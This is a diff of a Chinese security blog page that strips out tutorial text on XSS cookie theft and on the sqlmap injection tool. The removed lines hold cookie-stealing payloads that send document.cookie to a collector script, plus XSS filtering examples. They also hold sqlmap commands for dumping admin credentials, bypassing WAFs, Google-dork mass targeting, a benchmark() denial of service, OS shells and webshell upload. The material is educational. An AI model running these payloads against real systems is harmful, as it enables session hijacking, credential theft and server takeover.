-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;window.location.href=&#x27;http://127.0.0.1/cookie.php?cookie=&#x27;+document.cookie//</span><br><span class="line">&#x27;;s=document.createElement(&#x27;script&#x27;);document.getElementsByTagName(&#x27;body&#x27;)[0]</span><br><span class="line">.appendChild(s);s.src=&#x27;http://127.0.0.1/cookie.php?cookie=&#x27;+document.cookie;//</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>这些只能在本地获取，不能获公网的，如果你有没有vps可以考虑在线xss平台</p>
-<p>网上很多，百度就行，使用方法看看也就能懂</p>
-<h2 id="四、XSS漏洞防范"><a href="#四、XSS漏洞防范" class="headerlink" title="四、XSS漏洞防范"></a>四、XSS漏洞防范</h2><h3 id="4-1-反射型xss漏洞防范"><a href="#4-1-反射型xss漏洞防范" class="headerlink" title="4.1 反射型xss漏洞防范"></a>4.1 反射型xss漏洞防范</h3><p>php中xss的漏洞防范方法总结：&lt;参考自Segmentfault&gt;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">A.PHP直接输出html的，可以采用以下的方法进行过滤：</span><br><span class="line"></span><br><span class="line">    1.htmlspecialchars函数</span><br><span class="line">    2.htmlentities函数</span><br><span class="line">    3.HTMLPurifier.auto.php插件</span><br><span class="line">    4.RemoveXss函数</span><br><span class="line"></span><br><span class="line">B.PHP输出到JS代码中，或者开发Json API的，则需要前端在JS中进行过滤：</span><br><span class="line"></span><br><span class="line">    1.尽量使用innerText(IE)和textContent(Firefox),也就是jQuery的text()来输出文本内容</span><br><span class="line">    2.必须要用innerHTML等等函数，则需要做类似php的htmlspecialchars的过滤</span><br><span class="line"></span><br><span class="line">C.其它的通用的补充性防御手段</span><br><span class="line"></span><br><span class="line">    1.在输出html时，加上Content Security Policy的Http Header</span><br><span class="line">    （作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等）</span><br><span class="line">    （缺陷：IE或低版本的浏览器可能不支持）</span><br><span class="line">    2.在设置Cookie时，加上HttpOnly参数</span><br><span class="line">    （作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6）</span><br><span class="line">    （缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全）</span><br><span class="line">    3.在开发API时，检验请求的Referer参数</span><br><span class="line">    （作用：可以在一定程度上防止CSRF攻击）</span><br><span class="line">    （缺陷：IE或低版本的浏览器中，Referer参数可以被伪造）</span><br></pre></td></tr></table></figure>
-
-<p>这里我们选用<code>htmlentities()</code>函数进行测试：</p>
-<blockquote>
-<p>htmlentities() 函数把字符转换为 HTML 实体。</p>
-</blockquote>
-<p>新建Xss_htmlentities.php， 代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;XSS&lt;/title&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; </span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;input&quot;&gt;     </span><br><span class="line">&lt;input type=&quot;submit&quot;&gt; </span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">$XssReflex = $_GET[&#x27;input&#x27;];</span><br><span class="line">echo &#x27;output:&lt;br&gt;&#x27;.htmlentities($XssReflex);#仅在这里对变量 $XssReflex 做了处理.</span><br><span class="line">?&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>在Firefox输入url：<code>localhost/codoaudit/xss/Xsshtmlentities.php</code> :</p>
-<p><img src="xss-cookies/4.png" alt="img"></p>
-<p>当我们输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code> ：</p>
-<p><img src="xss-cookies/3.png" alt="img"></p>
-<p>可以看到页面并没有弹窗。<br> 我们再查看网页html代码：</p>
-<p><img src="xss-cookies/5.png" alt="1557672491438"> </p>
-<p>可以看到htmlentities()函数对用户输入的<code>&lt;&gt;</code>做了转义处理,恶意代码当然也就没法执行了。<br> 还有其他过滤函数，纸上学来终觉浅，有兴趣的同学可以自己去尝试一番</p>
-<h3 id="4-2-存储型xss漏洞防范"><a href="#4-2-存储型xss漏洞防范" class="headerlink" title="4.2 存储型xss漏洞防范"></a>4.2 存储型xss漏洞防范</h3><p>存储型XSS对用户的输入进行过滤的方式和反射型XSS相同，这里我们使用<code>htmlspecialchars()</code>函数进行演示：</p>
-<blockquote>
-<p>htmlentities() :把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体</p>
-</blockquote>
-<p>htmlspecialchars和htmlentities的区别：</p>
-<p><code>htmlspecialchars</code> 只转义 <code>&amp; 、&quot; 、&#39; 、&lt; 、&gt;</code> 这几个html代码，而 <code>htmlentities</code> 却会转化所有的html代码，连同里面的它无法识别的中文字符也会转化。</p>
-<p>新建Xss_htmlspecialchars_Storage.php ，代码如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;span style=&quot;font-size:18px;&quot;&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;/&gt;  </span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;  </span><br><span class="line">&lt;title&gt;XssStorage&lt;/title&gt;  </span><br><span class="line">&lt;/head&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;h2&gt;Message Board&lt;h2&gt;  </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;form action=&quot;Xss_htmlspecialchars_Storage.php&quot; method=&quot;post&quot;&gt;  </span><br><span class="line">Message:&lt;textarea id=&#x27;Mid&#x27; name=&quot;desc&quot;&gt;&lt;/textarea&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">Subuser:&lt;input type=&quot;text&quot; name=&quot;user&quot;/&gt;&lt;br&gt; </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; onclick=&#x27;loction=&quot;XssStorage.php&quot;&#x27;/&gt;  </span><br><span class="line">&lt;/form&gt;  </span><br><span class="line">&lt;?php  </span><br><span class="line">if(isset($_POST[&#x27;user&#x27;])&amp;&amp;isset($_POST[&#x27;desc&#x27;]))&#123;  </span><br><span class="line">$log=fopen(&quot;sqlStorage.txt&quot;,&quot;a&quot;);  </span><br><span class="line">fwrite($log,htmlspecialchars($_POST[&#x27;user&#x27;]).&quot;\r\n&quot;); # 在此对用户输入数据$_POST[&#x27;user&#x27;]进行过滤</span><br><span class="line">fwrite($log,htmlspecialchars($_POST[&#x27;desc&#x27;]).&quot;\r\n&quot;); # 在此对用户输入数据$_POST[&#x27;desc&#x27;]进行过滤</span><br><span class="line">fclose($log);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if(file_exists(&quot;sqlStorage.txt&quot;))  </span><br><span class="line">&#123;  </span><br><span class="line">$read= fopen(&quot;sqlStorage.txt&quot;,&#x27;r&#x27;);  </span><br><span class="line">while(!feof($read))  </span><br><span class="line">&#123;  </span><br><span class="line">    echo fgets($read).&quot;&lt;/br&gt;&quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">fclose($read);  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;&lt;/span&gt;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>在Firefox输入url：<code>localhost/codoaudit/xss/Xss_htmlspecialchars_Storage.php</code> :</p>
-<p><img src="xss-cookies/3.png" alt="img"></p>
-<p>当我们在Message中输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code> ：</p>
-<p><img src="xss-cookies/6.png" alt="1557672593579"></p>
-<p>可以看到页面并没有弹窗。<br> 我们再查看网页html代码：</p>
-<p><img src="xss-cookies/7.png" alt="1557672616306"></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/04/22/xss-cookies/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -959,192 +549,15 @@
 
 <h4 id="2-猜解表"><a href="#2-猜解表" class="headerlink" title="(2) 猜解表"></a>(2) 猜解表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables</span><br></pre></td></tr></table></figure>
 
-<h4 id="3-根据猜解的表进行猜解表的字段-假如通过2得到了admin这个表"><a href="#3-根据猜解的表进行猜解表的字段-假如通过2得到了admin这个表" class="headerlink" title="(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)"></a>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了<code>admin</code>这个表)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-根据字段猜解内容-假如通过3得到字段为username和password"><a href="#4-根据字段猜解内容-假如通过3得到字段为username和password" class="headerlink" title="(4) 根据字段猜解内容(假如通过3得到字段为username和password)"></a>(4) 根据字段猜解内容(假如通过3得到字段为<code>username</code>和password)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password</span><br></pre></td></tr></table></figure>
-
-<h3 id="二、SQLMAP用于Cookie注入"><a href="#二、SQLMAP用于Cookie注入" class="headerlink" title="二、SQLMAP用于Cookie注入"></a>二、SQLMAP用于Cookie注入</h3><p>(1) cookie注入，猜解表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2</span><br></pre></td></tr></table></figure>
-
-<p>(2) 猜解字段，(通过1的表猜解字段，假如表为admin)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T</span><br></pre></td></tr></table></figure>
-
-<p>(3) 猜解内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -T</span><br></pre></td></tr></table></figure>
-
-<h3 id="三、SQLMAP用于mysql中DDOS攻击"><a href="#三、SQLMAP用于mysql中DDOS攻击" class="headerlink" title="三、SQLMAP用于mysql中DDOS攻击"></a>三、SQLMAP用于mysql中DDOS攻击</h3><h4 id="1-获取一个Shell"><a href="#1-获取一个Shell" class="headerlink" title="(1) 获取一个Shell"></a>(1) 获取一个Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 --sql-shell</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-输入执行语句完成DDOS攻击"><a href="#2-输入执行语句完成DDOS攻击" class="headerlink" title="(2) 输入执行语句完成DDOS攻击"></a>(2) 输入执行语句完成DDOS攻击</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="四、SQLMAP用于mysql注入"><a href="#四、SQLMAP用于mysql注入" class="headerlink" title="四、SQLMAP用于mysql注入"></a>四、SQLMAP用于mysql注入</h3><p>(1) 查找数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="2-通过第一步的数据库查找表-假如数据库名为dataname"><a href="#2-通过第一步的数据库查找表-假如数据库名为dataname" class="headerlink" title="(2) 通过第一步的数据库查找表(假如数据库名为dataname)"></a>(2) 通过第一步的数据库查找表(假如数据库名为dataname)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname --tables</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="3-通过2中的表得出列名-假如表为table-name"><a href="#3-通过2中的表得出列名-假如表为table-name" class="headerlink" title="(3) 通过2中的表得出列名(假如表为table_name)"></a>(3) 通过2中的表得出列名(假如表为table_name)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="4-获取字段的值-假如扫描出id-user-password字段"><a href="#4-获取字段的值-假如扫描出id-user-password字段" class="headerlink" title="(4) 获取字段的值(假如扫描出id,user,password字段)"></a>(4) 获取字段的值(假如扫描出id,user,password字段)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C &quot;id,user,password&quot; --dump</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="五、SQLMAP中post登陆框注入"><a href="#五、SQLMAP中post登陆框注入" class="headerlink" title="五、SQLMAP中post登陆框注入"></a>五、SQLMAP中post登陆框注入</h3><p>(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</p>
-<blockquote>
-<p>我们在使用<code>Sqlmap</code>进行<code>post</code>型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合<code>burpsuite</code>来使用<code>sqlmap</code>，用这种方法进行<code>post</code>注入测试会更准确，操作起来也非常容易。</p>
-</blockquote>
-<p>用<code>burpsuite</code>把这个<code>post</code>请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下</p>
-<p>运行sqlmap并使用如下命令：紧接着<code>p</code>的是制定的参数名称</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r post.txt -p id</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
-<p>注入点：<a target="_blank" rel="noopener" href="http://testasp.vulnweb.com/Login.asp">http://testasp.vulnweb.com/Login.asp</a></p>
-<p>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p>
-<p>(2) 自动的搜索</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --forms</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>(3) 指定参数搜索</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --data &quot;tfUName=321&amp;tfUPass=321&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="六、SQLMAP中Google搜索注入"><a href="#六、SQLMAP中Google搜索注入" class="headerlink" title="六、SQLMAP中Google搜索注入"></a>六、SQLMAP中Google搜索注入</h3><p>inurl后面的语言是由自己定的</p>
-<p>注入过程中如果选y是注入，如果不是选n</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -g inurl:php?id=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="七、SQLMAP中的请求延迟"><a href="#七、SQLMAP中的请求延迟" class="headerlink" title="七、SQLMAP中的请求延迟"></a>七、SQLMAP中的请求延迟</h3><p>参数 –delay –safe-freq</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --delay 1</span><br><span class="line">sqlmap --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --safe-freq 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="八、SQLMAP绕过WAF防火墙"><a href="#八、SQLMAP绕过WAF防火墙" class="headerlink" title="八、SQLMAP绕过WAF防火墙"></a>八、SQLMAP绕过WAF防火墙</h3><p>注入点:<a target="_blank" rel="noopener" href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><code>space2morehash.py</code>中可以替换<code>space2hash.py</code>或者<code>base64encode.py</code>或者<code>charencode.py</code></p>
-<p>都是编码方式</p>
-<h3 id="九、SQLMAP查看权限"><a href="#九、SQLMAP查看权限" class="headerlink" title="九、SQLMAP查看权限"></a>九、SQLMAP查看权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 --privileges</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="十、SQLMAP伪静态注入"><a href="#十、SQLMAP伪静态注入" class="headerlink" title="十、SQLMAP伪静态注入"></a>十、SQLMAP伪静态注入</h3><h4 id="1-查找数据库"><a href="#1-查找数据库" class="headerlink" title="(1) 查找数据库"></a>(1) 查找数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --dbs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="2-通过1中的数据库查找对应的表-假如通过1，得到的是dataname"><a href="#2-通过1中的数据库查找对应的表-假如通过1，得到的是dataname" class="headerlink" title="(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)"></a>(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`python sqlmap.py ``-``u ``&quot;http://xxx.cn/index.php/Index/view/id/40.html&quot;` `-``D dataname ``--tables`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="3-通过2中的数据表得到字段-假如得到的是tablename表"><a href="#3-通过2中的数据表得到字段-假如得到的是tablename表" class="headerlink" title="(3) 通过2中的数据表得到字段(假如得到的是tablename表)"></a>(3) 通过2中的数据表得到字段(假如得到的是tablename表)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname --tables</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="4-通过3得到字段值-假如从3中得到字段id，password"><a href="#4-通过3得到字段值-假如从3中得到字段id，password" class="headerlink" title="(4) 通过3得到字段值(假如从3中得到字段id，password)"></a>(4) 通过3得到字段值(假如从3中得到字段id，password)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="十一、SQLMAP注入点执行命令与交互写shell"><a href="#十一、SQLMAP注入点执行命令与交互写shell" class="headerlink" title="十一、SQLMAP注入点执行命令与交互写shell"></a>十一、SQLMAP注入点执行命令与交互写shell</h3><h3 id="1-注入点：http-192-168-159-1-news-php-id-1"><a href="#1-注入点：http-192-168-159-1-news-php-id-1" class="headerlink" title="(1) 注入点：http://192.168.159.1/news.php?id=1"></a>(1) 注入点：<a target="_blank" rel="noopener" href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></h3><p>此处采用的是Linux系统</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 --os-cmd=ipconfig</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>出现语言的选择根据实际的测试网站选择语言</p>
-<p>指定目标站点D:/www/ </p>
-<p>(2) 获取Shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 --os-shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>出现语言的选择根据实际的测试网站选择语言</p>
-<p>指定目标站点D:/www/</p>
-<p>输入ipconfig/all</p>
-<p>创建用户和删除用户</p>
-<p>只要权限足够大，你可以输入使用任何命令。</p>
-<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h2><p>从数据库中搜索字段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>在<code>dedecms</code>数据库中搜索字段<code>admin</code>或者<code>password</code>。</p>
-<p>读取与写入文件</p>
-<p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
-<p><code>–file-read=RFILE</code> 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
-<p><code>–file-write=WFILE</code> 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
-<p><code>–file-dest=DFILE</code> 后端的数据库管理系统写入文件的绝对路径</p>
-<p>#示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>使用shell命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>接下来指定网站可写目录：</p>
-<p>“E:\php\htdocs\dvwa”</p>
-<p>#注：<code>mysql</code>不支持列目录，仅支持读取单个文件。<code>sqlserver</code>可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
-<h1 id="sqlmap详细命令："><a href="#sqlmap详细命令：" class="headerlink" title="sqlmap详细命令："></a>sqlmap详细命令：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--is-dba 当前用户权限（是否为root权限）</span><br><span class="line">--dbs 所有数据库</span><br><span class="line">--current-db 网站当前数据库</span><br><span class="line">--users 所有数据库用户</span><br><span class="line">--current-user 当前数据库用户</span><br><span class="line">--random-agent 构造随机user-agent</span><br><span class="line">--passwords 数据库密码</span><br><span class="line">--proxy http://local:8080 代理</span><br><span class="line">--threads 10   线程加速)</span><br><span class="line">--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>Options（选项）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--version 显示程序的版本号并退出</span><br><span class="line">--h, –help 显示此帮助消息并退出</span><br><span class="line">--v VERBOSE 详细级别：0-6（默认为1）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>Target（目标）：</p>
-<p>以下至少需要设置其中一个选项，设置目标URL。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--d DIRECT 直接连接到数据库。</span><br><span class="line">--u URL, –url=URL 目标URL。</span><br><span class="line">--l LIST 从Burp或WebScarab代理的日志中解析目标。</span><br><span class="line">--r REQUESTFILE 从一个文件中载入HTTP请求。</span><br><span class="line">--g GOOGLEDORK 处理Google dork的结果作为目标URL。</span><br><span class="line">--c CONFIGFILE 从INI配置文件中加载选项。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>Request（请求）：</p>
-<p>这些选项可以用来指定如何连接到目标URL。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">--data=DATA 通过POST发送的数据字符串</span><br><span class="line">--cookie=COOKIE HTTP Cookie头</span><br><span class="line">--cookie-urlencode URL 编码生成的cookie注入</span><br><span class="line">--drop-set-cookie 忽略响应的Set – Cookie头信息</span><br><span class="line">--user-agent=AGENT 指定 HTTP User – Agent头</span><br><span class="line">--random-agent 使用随机选定的HTTP User – Agent头</span><br><span class="line">--referer=REFERER 指定 HTTP Referer头</span><br><span class="line">--headers=HEADERS 换行分开，加入其他的HTTP头</span><br><span class="line">--auth-type=ATYPE 